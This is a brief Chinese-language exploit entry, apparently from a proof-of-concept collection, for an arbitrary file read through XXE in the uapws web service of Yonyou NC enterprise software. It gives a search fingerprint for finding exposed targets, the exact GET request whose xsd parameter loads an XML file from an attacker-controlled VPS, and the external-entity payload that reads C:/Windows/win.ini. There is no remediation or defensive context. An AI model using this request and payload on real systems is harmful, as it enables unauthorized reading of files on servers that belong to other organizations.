# 用友NC-uapws接口存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /uapws/service/nc.itf.bd.crm.IPsndocExportToCrmService?xsd=http://vps/win.xml HTTP/1.1`
- **其他**：Win.xml内容为：: | <?xml version="1.0" encoding="UTF-8"?><br/><!DOCTYPE data [<br/>  <!ENTITY winIni SYSTEM "file:///C:/Windows/win.ini"><br/>]><br/><data><br/>  <content>&winIni;</content><br/></data>
| ---